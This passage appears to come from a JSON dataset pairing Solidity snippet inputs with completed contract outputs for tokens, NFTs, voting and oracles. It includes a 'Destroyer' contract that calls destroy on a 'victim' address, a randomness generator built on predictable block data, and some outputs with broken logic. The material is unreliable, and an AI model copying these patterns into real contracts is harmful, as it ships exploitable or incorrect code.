        "input": "\npragma solidity >=0.7.0 <0.9.0;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address tokenOwner) external view returns (uint256 balance);\n    function allowance(address tokenOwner, address spender) external view returns (uint256 remaining);\n    function transfer(address to, uint tokens) external returns (bool success);\n    function approve(address spender, uint tokens) external returns (bool success);\n    function transferFrom(address from, address to, uint256 tokens) external returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint256 tokens);\n    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);\n}\n\ncontract SafeMath {\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\n        c = a + b;\n        require(c >= a);\n    }\n    function safeSub(uint a, uint b) public pure returns (uint c) {\n        require(b <= a); c = a - b; \n        \n    } \n    function safeMul(uint a, uint b) public pure returns (uint c) { \n        c = a * b; require(a == 0 || c / a == b); \n        \n    } \n    function safeDiv(uint a, uint b) public pure returns (uint c) { \n        require(b > 0);\n        c = a / b;\n    }\n}\n\n\ncontract TTKN is IERC20, SafeMath {\n    string public name;\n    string public symbol;\n    uint8 public decimals; \n\n    uint256 public _totalSupply;\n\n    mapping(address => uint256) balances;\n    mapping(address => mapping(address => uint256)) allowed;\n\n    \n    constructor() {\n        name = \"Test Token\";\n        symbol = \"TTKN\";\n        decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n\n        balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n        function totalSupply() public override view returns (uint256) {\n            return _totalSupply  - balances[address(0)];\n        }\n\n        function balanceOf(address tokenOwner) public override view returns (uint256 balance) {\n            return balances[tokenOwner];\n        }\n\n        function allowance(address tokenOwner, address spender) public override view returns (uint256 remaining) {\n            return allowed[tokenOwner][spender];\n        }\n\n        function approve(address spender, uint256 tokens) public override returns (bool success) {\n            allowed[msg.sender][spender] = tokens;\n            emit Approval(msg.sender, spender, tokens);\n            return true;\n        }\n\n        function transfer(address to, uint256 tokens) public override returns (bool success) {\n            balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n            balances[to] = safeAdd(balances[to], tokens);\n            emit Transfer(msg.sender, to, tokens);\n            return true;\n        }\n\n        function transferFrom(address from, address to, uint256 tokens) public override returns (bool success) {\n            balances[from] = safeSub(balances[from], tokens);\n            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n            balances[to] = safeAdd(balances[to], tokens);\n            emit Transfer(from, to, tokens);\n            return true;\n        }\n    }\n\n\n",
        "output": "// SPDX-License-Identifier: Unlicensed\n\npragma solidity >=0.7.0 <0.9.0;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address tokenOwner) external view returns (uint256 balance);\n    function allowance(address tokenOwner, address spender) external view returns (uint256 remaining);\n    function transfer(address to, uint tokens) external returns (bool success);\n    function approve(address spender, uint tokens) external returns (bool success);\n    function transferFrom(address from, address to, uint256 tokens) external returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint256 tokens);\n    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);\n}\n\n// ----------------------------------------------------------------------------\n// Safe Math Library\n// ----------------------------------------------------------------------------\ncontract SafeMath {\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\n        c = a + b;\n        require(c >= a);\n    }\n    function safeSub(uint a, uint b) public pure returns (uint c) {\n        require(b <= a); c = a - b; \n        \n    } \n    function safeMul(uint a, uint b) public pure returns (uint c) { \n        c = a * b; require(a == 0 || c / a == b); \n        \n    } \n    function safeDiv(uint a, uint b) public pure returns (uint c) { \n        require(b > 0);\n        c = a / b;\n    }\n}\n\n\ncontract TTKN is IERC20, SafeMath {\n    string public name;\n    string public symbol;\n    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n\n    uint256 public _totalSupply;\n\n    mapping(address => uint256) balances;\n    mapping(address => mapping(address => uint256)) allowed;\n\n    /**\n     * Constrctor function\n     *\n     * Initializes contract with initial supply tokens to the creator of the contract\n     */\n    constructor() {\n        name = \"Test Token\";\n        symbol = \"TTKN\";\n        decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n\n        balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n        function totalSupply() public override view returns (uint256) {\n            return _totalSupply  - balances[address(0)];\n        }\n\n        function balanceOf(address tokenOwner) public override view returns (uint256 balance) {\n            return balances[tokenOwner];\n        }\n\n        function allowance(address tokenOwner, address spender) public override view returns (uint256 remaining) {\n            return allowed[tokenOwner][spender];\n        }\n\n        function approve(address spender, uint256 tokens) public override returns (bool success) {\n            allowed[msg.sender][spender] = tokens;\n            emit Approval(msg.sender, spender, tokens);\n            return true;\n        }\n\n        function transfer(address to, uint256 tokens) public override returns (bool success) {\n            balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n            balances[to] = safeAdd(balances[to], tokens);\n            emit Transfer(msg.sender, to, tokens);\n            return true;\n        }\n\n        function transferFrom(address from, address to, uint256 tokens) public override returns (bool success) {\n            balances[from] = safeSub(balances[from], tokens);\n            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n            balances[to] = safeAdd(balances[to], tokens);\n            emit Transfer(from, to, tokens);\n            return true;\n        }\n    }\n\n",
        "changed": 0
    },
    "562.sol": {
        "input": "   ...\n\n    assert(false);\n\n    return tokenIdsIdx; \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public tokenIdsIdx;\n\n    function myFunction() public returns (uint256) {\n        // ... (other code)\n\n        assert(false);\n\n        return tokenIdsIdx; \n    }\n}\n\n",
        "changed": 0
    },
    "563.sol": {
        "input": "function _setApprovalForAll(\n        address owner,\n        address operator,\n        bool approved\n    ) internal virtual {\n        require(owner != operator, \"ERC721: approve to caller\");\n        _operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    }\n\nmapping(address => mapping(address => bool)) private _operatorApprovals;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\n\n    function _setApprovalForAll(\n        address owner,\n        address operator,\n        bool approved\n    ) internal virtual {\n        require(owner != operator, \"ERC721: approve to caller\");\n        _operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    }\n\n    function isApprovedForAll(address owner, address operator) public view returns (bool) {\n        return _operatorApprovals[owner][operator];\n    }\n}\n\n",
        "changed": 0
    },
    "564.sol": {
        "input": "function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;\nfunction safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external payable;\n\nuint256 fee = 0.1 ether;\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external payable{\n    require(msg.value >= fee, \"sent ether is lower than fee\")\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping(address => uint256) public balances;\n    mapping(uint256 => address) public tokenOwners;\n\n    uint256 public fee = 0.1 ether;\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);\n\n    function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes memory data) external payable {\n        transferFrom(_from, _to, _tokenId);\n    }\n\n    function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable {\n        transferFrom(_from, _to, _tokenId);\n    }\n\n    function transferFrom(address _from, address _to, uint256 _tokenId) public payable {\n        require(msg.value >= fee, \"Sent ether is lower than fee\");\n        require(tokenOwners[_tokenId] == _from, \"You are not the owner of this token\");\n        require(_to != address(0), \"Receiver cannot be the zero address\");\n\n        balances[_from] -= _tokenId;\n        balances[_to] += _tokenId;\n        tokenOwners[_tokenId] = _to;\n\n        emit Transfer(_from, _to, _tokenId);\n    }\n}\n\n",
        "changed": 1
    },
    "565.sol": {
        "input": "pragma solidity >=0.5.0 <0.9.0;\n\ncontract Day4 {\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function send(address payable[] memory to, uint256[] memory amount)\n        public\n        payable\n        ownerOnly\n    {\n        require(to.length == amount.length, \"to must be same length as amount\");\n        for (uint256 i = 0; i < to.length; i++) {\n            to[i].transfer(amount[i]);\n        }\n    }\n\n    modifier ownerOnly() {\n        require(msg.sender == owner,\"You are not the owner\");\n        _;\n    }\n\n    function deposit() public payable {\n\n    }\n} \n\n\n",
        "output": "//SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.5.0 <0.9.0;\n\ncontract Day4 {\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function send(address payable[] memory to, uint256[] memory amount)\n        public\n        payable\n        ownerOnly\n    {\n        require(to.length == amount.length, \"to must be same length as amount\");\n        for (uint256 i = 0; i < to.length; i++) {\n            to[i].transfer(amount[i]);\n        }\n    }\n\n    modifier ownerOnly() {\n        require(msg.sender == owner,\"You are not the owner\");\n        _;\n    }\n\n    // NOTE: Call this function for first, and before this operation set the values inside msg.value textbox in \n    //       Remix IDE (if you're using it) \n    function deposit() public payable {\n\n    }\n} \n\n",
        "changed": 0
    },
    "566.sol": {
        "input": "import \"A.sol\";\n\nA a = new A(argumnet) \n\naddress(a) \n\n\n",
        "output": "",
        "changed": 0
    },
    "567.sol": {
        "input": "...\nfor (uint i=0; i<len; i++) {\n    try IERC20(tokenAddresses[i]).balanceOf(walletAddress) returns (uint256 balance) {\n        balances[i] = balance;\n    } catch {}\n}\n...\n\n\n",
        "output": "",
        "changed": 0
    },
    "568.sol": {
        "input": "import \"@openzeppelin/contracts-upgradeable/token/ERC721/IERC721Upgradeable.sol\";\n\n\n",
        "output": "",
        "changed": 0
    },
    "569.sol": {
        "input": "function get_last_tokenID() public view returns (uint256) {\n    return(_tokenIds.current());\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "571.sol": {
        "input": "oracleResponses[key] = ResponseInfo({requester: msg.sender, isOpen: true});\n\noracleResponses[key].requester = msg.sender;\noracleResponses[key].isOpen = true;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract OracleContract {\n\n    // A struct to represent information about oracle responses\n    struct ResponseInfo {\n        address requester;\n        bool isOpen;\n    }\n\n    // A mapping to store oracle responses\n    mapping (bytes32 => ResponseInfo) oracleResponses;\n\n    // A function to add a new oracle response\n    function addOracleResponse(bytes32 key) public {\n        // Add a new response to the mapping\n        oracleResponses[key] = ResponseInfo({requester: msg.sender, isOpen: true});\n    }\n\n    // A function to update an oracle response\n    function updateOracleResponse(bytes32 key) public {\n        // Update the response in the mapping\n        oracleResponses[key].requester = msg.sender;\n        oracleResponses[key].isOpen = true;\n    }\n}\n\n",
        "changed": 0
    },
    "572.sol": {
        "input": "function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);\n\nfunction swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ncontract MyContract {\n    IUniswapV2Router02 public uniswapV2Router;\n\n    constructor(address _uniswapV2Router) public {\n        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);\n    }\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts) {\n        amounts = uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amountIn, \n            amountOutMin, \n            path, \n            to, \n            deadline\n        );\n        return amounts;\n    }\n}\n\n",
        "changed": 0
    },
    "573.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract TargetContract {\n    function foo() external pure returns (bool) {\n        return true;\n    }\n}\n\npragma solidity ^0.8;\n\ninterface ITargetContract {\n    function foo() external returns (bool);\n}\n\ncontract SourceContract {\n    function baz() external {\n        ITargetContract targetContract = ITargetContract(address(0x123));\n        bool returnedValue = targetContract.foo();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract TargetContract {\n    function foo() external pure returns (bool) {\n        return true;\n    }\n}\n\npragma solidity ^0.8;\n\ninterface ITargetContract {\n    function foo() external returns (bool);\n}\n\ncontract SourceContract {\n    function baz() external {\n        ITargetContract targetContract = ITargetContract(address(0x123));\n        bool returnedValue = targetContract.foo();\n    }\n}\n\n",
        "changed": 0
    },
    "574.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract GameToken is ERC20 {\n    address private gameBackend;\n\n    constructor(address _gameBackend) ERC20(\"Game Token\", \"GT\") {\n        gameBackend = _gameBackend;\n    }\n\n    function mint(address to, uint256 amount) external {\n        require(msg.sender == gameBackend, \"Only game backend can mint tokens\");\n        _mint(to, amount);\n    }\n}\n\nasync function swapOffchainToOnchainTokens(userAddress, swapAmount) {\n\n     the user\n    const gameTokenContract = new web3.eth.Contract(GameTokenABI, \n    GameTokenAddress);\n    await gameTokenContract.methods.mint(userAddress, \n    swapAmount).send({ from: gameBackendAddress });\n }\n\n function mint(address to, uint256 amount) external {\n    require(msg.sender == gameBackend, \"Only game backend can mint \n    tokens\");\n    _mint(to, amount);\n }\n\n\n",
        "output": "",
        "changed": 0
    },
    "575.sol": {
        "input": "pragma solidity ^0.6.0;\n\nimport \"./ERC721.sol\";\n\ncontract Mytoken is ERC721 {\n    string constant name = \"MyToken\";\n    string constant symbol = \"MTKN\";\n\n    constructor() ERC721(name, symbol) {\n        \n    }\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "577.sol": {
        "input": "compiled_sol=compile_standard({\n    # not \"solidity\"\n    \"language\":\"Solidity\",\n    # not \"simpleStorage\"\n    \"sources\":{\"SimpleStorage.sol\":{\"content\":simple_storage_file}},\n    \"settings\":{\n        \"outputSelection\":{\n            \"*\":{\n                \"*\":[\"abi\",\"metadata\",\"evm.bytecode\",\"evm.sourceMap\"]\n            }\n        }\n    }\n},\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint data;\n\n    // Function to set the value of data\n    function set(uint x) public {\n        data = x;\n    }\n\n    // Function to get the value of data\n    function get() public view returns (uint) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "578.sol": {
        "input": "struct voter {\n     uint ID;\n     string firstName;\n     string lastName;\n }\n\n contract Poll {\n     uint public numVoters;\n\n     event VoterAdded(\n         voter newVoter\n     );\n\n     function AddVoter(string memory _firstName, string memory _lastName) public returns \n     (voter memory)\n     {\n         numVoters++;\n         voter memory _voter = voter(numVoters, _firstName, _lastName);\n         _voter.ID = numVoters;\n         _voter.firstName = _firstName;\n         _voter.lastName = _lastName;\n         emit VoterAdded(_voter);\n         return _voter;\n\n     }\n} \n\nit('Poll 1 : create voter and candidate objects2', async () => {  \n      const tx = await poll.AddVoter('Jack', 'Jackson');\n      const reciept = await tx.wait();\n      const [ VoterAdded ] = reciept.events || [];\n      const result = [...(VoterAdded.args || [])]; \n      const JJ = result[0];\n      assert.equal(JJ.firstName, 'Jack');\n   });\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Poll {\n\n    struct Voter {\n        uint ID;\n        string firstName;\n        string lastName;\n    }\n\n    uint public numVoters;\n    mapping(uint => Voter) public voters;\n\n    event VoterAdded(\n        uint ID,\n        string firstName,\n        string lastName\n    );\n\n    function AddVoter(string memory _firstName, string memory _lastName) public returns \n    (uint, string memory, string memory)\n    {\n        numVoters++;\n        Voter memory _voter = Voter(numVoters, _firstName, _lastName);\n        voters[numVoters] = _voter;\n        emit VoterAdded(numVoters, _voter.firstName, _voter.lastName);\n        return (numVoters, _voter.firstName, _voter.lastName);\n    }\n} \n\n",
        "changed": 0
    },
    "579.sol": {
        "input": "struct ProposalVote {\n    bool isTrue;\n    uint256[] votes;\n    mapping(address => bool) hasVoted;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract VotingContract {\n    struct ProposalVote {\n        bool isTrue;\n        uint256[] votes;\n        mapping(address => bool) hasVoted;\n    }\n\n    ProposalVote public proposal;\n\n    constructor() public {\n        proposal.isTrue = false;\n    }\n\n    function vote(uint256 _vote) public {\n        require(!proposal.hasVoted[msg.sender], \"You have already voted.\");\n        proposal.votes.push(_vote);\n        proposal.hasVoted[msg.sender] = true;\n        if(_vote == 1) {\n            proposal.isTrue = true;\n        }\n    }\n\n    function getVotes() public view returns(uint256[] memory) {\n        return proposal.votes;\n    }\n\n    function getVoteStatus() public view returns(bool) {\n        return proposal.isTrue;\n    }\n}\n\n",
        "changed": 0
    },
    "580.sol": {
        "input": "contract Pool is ERC20 {\n  ...\n  function deposit(uint256 amount) public payable {\n    uint256 contractBalance = ERC20(stakeToken).balanceOf(address(this));\n    uint256 proportion = amount * totalSupply() / contractBalance;\n    ERC20(stakeToken).transferFrom(msg.sender, address(this), amount);\n    _mint(msg.sender, proportion);\n  }\n\n  function withdraw() public payable {\n    uint256 proportion = balanceO(msg.sender);\n    uint256 contractBalance = ERC20(stakeToken).balanceOf(address(this));\n    uint256 withdrawAmount = proportion * contractBalance / totalSupply();\n    _burn(msg.sender, proportion);\n    \n    ERC20(stakeToken).transfer(msg.sender, withdrawAmount);\n  }\n}\n\n\n\n",
        "output": "",
        "changed": 0
    },
    "581.sol": {
        "input": "encode_mwr [type=\"ethabiencode\"\n            abi=\"(bytes32 requestId, string _volume)\"\n            data=\"{\\\\\"requestId\\\\\": $(decode_log.requestId), \\\\\"_volume\\\\\": $(volume_parse)}\"\n            ]\n\npragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/ChainlinkClient.sol\";\n\n * Request testnet LINK and ETH here: https:\n * Find information on LINK Token Contracts and get the latest ETH and LINK faucets here: https:\n\ncontract APIConsumer is ChainlinkClient {\n    using Chainlink for Chainlink.Request;\n  \n    string public volume;\n    \n    address private oracle;\n    bytes32 private jobId;\n    uint256 private fee;\n    \n    \n    constructor() {\n        setPublicChainlinkToken();\n        oracle = 0xF405B99ACa8578B9eb989ee2b69D518aaDb90c1F;\n        jobId = \"c51694e71fa94217b0f4a71b2a6b565a\";\n        fee = 0.1 * 10 ** 18; \n    }\n    \n    \n    function requestVolumeData() public returns (bytes32 requestId) \n    {\n        Chainlink.Request memory request = buildChainlinkRequest(jobId, address(this), this.fulfill.selector);\n        \n        request.add(\"get\", \"https:\n        \n        request.add(\"path\", \"RAW.ETH.USD.MARKET\");\n        \n        \n        return sendChainlinkRequestTo(oracle, request, fee);\n    }\n    \n    \n \n    function fulfill(bytes32 _requestId, string memory _volume) public recordChainlinkFulfillment(_requestId)\n    {\n        volume = _volume;\n        \n    }\n    \n}\n\n",
        "output": "",
        "changed": 0
    },
    "582.sol": {
        "input": "modifier isValidCertificate(bytes data) {\n    require(something);\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CertificateHandler {\n    mapping (address => bytes) public certificates;\n\n    modifier isValidCertificate(address _address) {\n        require(certificates[_address].length > 0);\n        _;\n    }\n\n    function setCertificate(address _address, bytes memory _certificate) public {\n        certificates[_address] = _certificate;\n    }\n\n    function getCertificate(address _address) public view isValidCertificate(_address) returns (bytes memory) {\n        return certificates[_address];\n    }\n}\n\n",
        "changed": 0
    },
    "584.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Foo {\n        string foo1;\n    }\n\n    Foo foo1 = Foo(\"foo\");\n\n    function myFunction() public {\n        Foo memory foo2 = Foo(\"foo\"); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Foo {\n        string foo1;\n    }\n\n    // implicit `storage` location of the property\n    Foo foo1 = Foo(\"foo\");\n\n    function myFunction() public {\n        // need to explicitly state location of the variable\n        Foo memory foo2 = Foo(\"foo\"); \n    }\n}\n\n",
        "changed": 0
    },
    "586.sol": {
        "input": "contract Evolution is IERC721Receiver {\n    function change(uint256 gen1tokenId) external {\n        EXAMPLE_CONTRACT.safeTransferFrom(msg.sender, address(this), gen1tokenId);\n    }\n\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) override external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "587.sol": {
        "input": "victim.call(abi.encodeWithSignature(\"destroy(address)\", _to));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Destroyer {\n    address payable public victim;\n\n    constructor(address payable _victim) public {\n        victim = _victim;\n    }\n\n    function destroy(address _to) public {\n        (bool success,) = victim.call(abi.encodeWithSignature(\"destroy(address)\", _to));\n        require(success, \"Failed to destroy the contract\");\n    }\n}\n\n",
        "changed": 1
    },
    "588.sol": {
        "input": "for(uint i = _findForm; _mycoin.length; i++)\n\nshould be\n\nfor(uint i = _findForm; i < _mycoin.length; i++)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyCoin {\n    struct Coin {\n        string name;\n        uint value;\n    }\n\n    Coin[] public myCoins;\n\n    function addCoin(string memory _name, uint _value) public {\n        Coin memory newCoin = Coin({\n            name: _name,\n            value: _value\n        });\n        \n        myCoins.push(newCoin);\n    }\n\n    function findCoin(string memory _name) public view returns(uint, uint) {\n        for(uint i = 0; i < myCoins.length; i++) {\n            if (keccak256(abi.encodePacked(myCoins[i].name)) == keccak256(abi.encodePacked(_name))) {\n                return (i, myCoins[i].value);\n            }\n        }\n        revert('Coin not found');\n    }\n}\n\n",
        "changed": 0
    },
    "589.sol": {
        "input": "contract test {\n    address[] arr1 = [0x778E08a594887B208d18a429cfD30d740e0fea71, 0xE8088D6c465Eaa58E123aa08623abaAFFBBBB55B];\n    \n    function arrayFunction() public pure{\n        address[] memory arr2 = new address[](2);\n        arr2[0] = 0x778E08a594887B208d18a429cfD30d740e0fea71;\n        arr2[1] = 0xE8088D6c465Eaa58E123aa08623abaAFFBBBB55B;\n    }\n}\n\n\n",
        "output": "contract test {\n    address[] arr1 = [0x778E08a594887B208d18a429cfD30d740e0fea71, 0xE8088D6c465Eaa58E123aa08623abaAFFBBBB55B];\n    \n    function arrayFunction() public pure{\n        address[] memory arr2 = new address[](2);\n        arr2[0] = 0x778E08a594887B208d18a429cfD30d740e0fea71;\n        arr2[1] = 0xE8088D6c465Eaa58E123aa08623abaAFFBBBB55B;\n    }\n}\n\n",
        "changed": 0
    },
    "590.sol": {
        "input": "uint256 public  monthlySalary;\n\nfunction setMonthlySalary() public {\n    monthlySalary= yearlySalary / months * conversionRate;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SalaryContract {\n    uint256 public monthlySalary;\n    uint256 public yearlySalary;\n    uint256 public conversionRate;\n    uint256 constant months = 12;\n\n    constructor(uint256 _yearlySalary, uint256 _conversionRate) public {\n        yearlySalary = _yearlySalary;\n        conversionRate = _conversionRate;\n        setMonthlySalary();\n    }\n    \n    function setMonthlySalary() public {\n        monthlySalary= yearlySalary / months * conversionRate;\n    }\n    \n    function getMonthlySalary() public view returns(uint256) {\n        return monthlySalary;\n    }\n    \n    function updateYearlySalary(uint256 _newYearlySalary) public {\n        yearlySalary = _newYearlySalary;\n        setMonthlySalary();\n    }\n    \n    function updateConversionRate(uint256 _newConversionRate) public {\n        conversionRate = _newConversionRate;\n        setMonthlySalary();\n    }\n}\n\n",
        "changed": 1
    },
    "591.sol": {
        "input": "    function div128x128 (uint256 x, uint256 y) internal pure returns (uint256) {\n        unchecked {\n            require (y != 0);\n            uint256 xDec = x & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;\n            uint256 xInt = x >> 128;\n            uint256 hi = xInt*(MAX_128x128/y);\n            uint256 lo = (xDec*(MAX_128x128/y))>>128;\n            \n            require (hi+lo <= MAX_128x128);\n            return hi+lo;\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Division {\n    uint256 constant MAX_128x128 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;\n\n    function div128x128 (uint256 x, uint256 y) internal pure returns (uint256) {\n        unchecked {\n            require (y != 0, \"Division by zero is not allowed.\");\n            uint256 xDec = x & MAX_128x128;\n            uint256 xInt = x >> 128;\n            uint256 hi = xInt * (MAX_128x128 / y);\n            uint256 lo = (xDec * (MAX_128x128 / y)) >> 128;\n\n            require (hi + lo <= MAX_128x128, \"Overflow error\");\n            return hi + lo;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "592.sol": {
        "input": "pragma solidity ^0.8.9;\n\ncontract Random {\n\n\n    function roll(uint256 number) public view returns (bool) {\n        uint256 d = uint256(\n            keccak256(abi.encodePacked(block.difficulty, block.timestamp))\n        ) % 101;\n        if (d <= number) return true;\n        return false;\n    }\n\n    \n    function random(uint256 number, uint256 counter)\n        public\n        view\n        returns (uint256)\n    {\n        return\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        block.timestamp,\n                        block.difficulty,\n                        msg.sender,\n                        counter\n                    )\n                )\n            ) % number;\n    }\n\n\n    function randomString(uint256 length) public view returns (string memory) {\n        require(length <= 14, \"Length cannot be greater than 14\");\n        require(length >= 1, \"Length cannot be Zero\");\n        bytes memory randomWord = new bytes(length);\n        bytes memory chars = new bytes(62);\n        chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n        for (uint256 i = 0; i < length; i++) {\n            uint256 randomNumber = random(62, i);\n            randomWord[i] = chars[randomNumber];\n        }\n        return string(randomWord);\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\ncontract Random {\n\n    //Roll Chance\n\n    function roll(uint256 number) public view returns (bool) {\n        uint256 d = uint256(\n            keccak256(abi.encodePacked(block.difficulty, block.timestamp))\n        ) % 101;\n        if (d <= number) return true;\n        return false;\n    }\n\n    //Random Number Generator\n    \n    function random(uint256 number, uint256 counter)\n        public\n        view\n        returns (uint256)\n    {\n        return\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        block.timestamp,\n                        block.difficulty,\n                        msg.sender,\n                        counter\n                    )\n                )\n            ) % number;\n    }\n\n    //Random String Generator (Max length 14)\n\n    function randomString(uint256 length) public view returns (string memory) {\n        require(length <= 14, \"Length cannot be greater than 14\");\n        require(length >= 1, \"Length cannot be Zero\");\n        bytes memory randomWord = new bytes(length);\n        // since we have 62 Characters\n        bytes memory chars = new bytes(62);\n        chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n        for (uint256 i = 0; i < length; i++) {\n            uint256 randomNumber = random(62, i);\n            // Index access for string is not possible\n            randomWord[i] = chars[randomNumber];\n        }\n        return string(randomWord);\n    }\n}\n\n",
        "changed": 0
    },
    "593.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract Testing {\n\n    struct Schema {\n        mapping(string => string) entity;\n    }\n\n    struct SchemaMapping {\n        string[] key;\n        string[] value;\n    }\n\n    mapping(uint256 => Schema) schemas;\n    mapping(uint256 => SchemaMapping[]) schemaMappings;\n\n    function createSchema(uint256 id, string memory key, string memory value) public {\n        SchemaMapping[] storage schemamapping = schemaMappings[id];\n        SchemaMapping storage singleSchemaItem = schemamapping.push();\n        singleSchemaItem.key.push(key);\n        singleSchemaItem.value.push(value);\n\n        schemas[id].entity[key] = value;\n    }\n\n    function getSchemaElemet(uint256 id) public view returns (SchemaMapping[] memory) {\n        return schemaMappings[id];\n    }\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Testing {\n\n    struct SchemaMapping {\n        string key;\n        string value;\n    }\n\n    mapping(uint256 => mapping(string => string)) schemas;\n    mapping(uint256 => SchemaMapping[]) schemaMappings;\n\n    function createSchema(uint256 id, string memory key, string memory value) public {\n        SchemaMapping memory newSchemaMapping = SchemaMapping({key: key, value: value});\n        schemaMappings[id].push(newSchemaMapping);\n        schemas[id][key] = value;\n    }\n\n    function getSchemaElement(uint256 id, uint256 index) public view returns (string memory, string memory) {\n        return (schemaMappings[id][index].key, schemaMappings[id][index].value);\n    }\n    \n    function getSchemaElementValue(uint256 id, string memory key) public view returns (string memory) {\n        return schemas[id][key];\n    }\n}\n\n",
        "changed": 0
    },
    "594.sol": {
        "input": "uint256 answer = 2\nbytes32 salt = 0x0000000000000000000000000000000000000000000000000000007465737432\n\n0x00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000007465737432\n\n0x566d7dd4e9dc72e9beef887f2982703a0d0f9dd1b6505ee3ff5310c7383637bd\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract {\n    uint256 public answer;\n    bytes32 public salt;\n\n    constructor() public {\n        answer = 2;\n        salt = 0x0000000000000000000000000000000000000000000000000000007465737432;\n    }\n\n    function hashFunction() public view returns (bytes32) {\n        return keccak256(abi.encodePacked(answer, salt));\n    }\n}\n\n",
        "changed": 0
    },
    "595.sol": {
